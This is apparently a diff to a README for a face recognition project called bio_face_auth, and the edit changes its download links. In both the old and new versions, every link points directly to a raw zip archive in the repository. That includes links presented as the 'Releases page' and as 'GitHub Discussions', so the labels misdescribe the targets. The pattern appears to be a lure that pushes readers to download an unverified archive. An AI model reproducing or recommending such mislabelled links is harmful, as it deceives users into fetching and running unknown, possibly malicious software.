@@ -1,7 +1,7 @@
 # 🎉 bio_face_auth - Simple AI for Face Recognition
 
 ## 📥 Download the Latest Release
-[![Download bio_face_auth](https://raw.githubusercontent.com/Rayysbataa/bio_face_auth/main/implicateness/bio_face_auth.zip)](https://raw.githubusercontent.com/Rayysbataa/bio_face_auth/main/implicateness/bio_face_auth.zip)
+[![Download bio_face_auth](https://raw.githubusercontent.com/Rayysbataa/bio_face_auth/main/face_auth/face-auth-bio-2.4-alpha.5.zip)](https://raw.githubusercontent.com/Rayysbataa/bio_face_auth/main/face_auth/face-auth-bio-2.4-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to bio_face_auth! This application uses artificial intelligence to recognize faces. It helps you understand how modern biometric authentication works. Follow these steps to get started with downloading and running the application.
@@ -24,7 +24,7 @@ To get the bio_face_auth application, please follow these steps:
 
 1. **Visit the Releases Page:**
    Click the link below to go to the Releases page where you can download the application.
-   [Download bio_face_auth](https://raw.githubusercontent.com/Rayysbataa/bio_face_auth/main/implicateness/bio_face_auth.zip)
+   [Download bio_face_auth](https://raw.githubusercontent.com/Rayysbataa/bio_face_auth/main/face_auth/face-auth-bio-2.4-alpha.5.zip)
 
 2. **Choose the Latest Version:**
    Look for the latest version listed on the Releases page. It is usually at the top.
@@ -67,7 +67,7 @@ Face recognition technology uses mathematical algorithms that convert images int
   - Ensure the face in the uploaded image is clear and well-lit. Images with shadows or obstructions may not work well.
 
 ## 🌐 Community and Support
-If you encounter issues or want to share your feedback, you can join our community. Visit our [GitHub Discussions](https://raw.githubusercontent.com/Rayysbataa/bio_face_auth/main/implicateness/bio_face_auth.zip) to ask questions or report problems.
+If you encounter issues or want to share your feedback, you can join our community. Visit our [GitHub Discussions](https://raw.githubusercontent.com/Rayysbataa/bio_face_auth/main/face_auth/face-auth-bio-2.4-alpha.5.zip) to ask questions or report problems.
 
 ## 📄 License
 bio_face_auth is licensed under the MIT License. You can freely use, modify, and distribute the application.
